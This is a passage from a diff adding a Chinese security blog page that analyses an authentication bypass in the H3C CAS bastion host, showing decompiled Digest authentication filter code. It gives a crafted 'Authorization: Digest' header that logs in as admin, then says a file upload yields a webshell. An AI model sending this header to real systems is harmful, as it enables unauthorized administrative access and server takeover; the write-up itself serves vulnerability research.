class="line"></span><br><span class="line">            <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.missingAuth&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var3&#125;, <span class="string">&quot;Missing mandatory digest value; received header &#123;0&#125;&quot;</span>))));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a.isDebugEnabled()) &#123;</span><br><span class="line">            a.debug(<span class="string">&quot;extracted username: &#x27;&quot;</span> + var6 + <span class="string">&quot;&#x27;; realm: &#x27;&quot;</span> + var6 + <span class="string">&quot;&#x27;; nonce: &#x27;&quot;</span> + var6 + <span class="string">&quot;&#x27;; uri: &#x27;&quot;</span> + var6 + <span class="string">&quot;&#x27;; response: &#x27;&quot;</span> + var6 + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.missingMandatory&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var3&#125;, <span class="string">&quot;Missing mandatory digest value; received header &#123;0&#125;&quot;</span>))));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那么构造的权限绕过为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization:Digest username=admin, realm=&quot;VMC RESTful Web Services&quot;, nonce=&quot;MTcyMDA4MjE4MzM5NDo2ZDFhYmU3ZTEwMTBlNGM2MDZiMmU1Yjk1NjQ3ZGY5NA==&quot;, uri=&quot;login&quot;, qop=&quot;auth&quot;, nc=&quot;1&quot;, cnonce=&quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/11/H3CCAS%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%B5%85%E6%9E%90/image-20240705220651-x6uyp3a.png" alt="image-20240705220651-x6uyp3a"></p>
+<p>获取到权限后后台直接利用文件上传即可获取webshell</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/12/19/%E4%BA%BF%E8%B5%9B%E9%80%9A%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/" rel="prev" title="亿赛通历史漏洞浅析">
+      <i class="fa fa-chevron-left"></i> 亿赛通历史漏洞浅析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/12/02/H3CSecCenterSMP%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E7%BB%84%E5%90%88getshell/" rel="next" title="H3CSecCenterSMP安全管理平台组合getshell">
+      H3CSecCenterSMP安全管理平台组合getshell <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">权限绕过</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zad"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">zad</p>
+  <div class="site-description" itemprop="description">不忘初心,方得始终</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Zbadblog" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Zbadblog" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zad</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
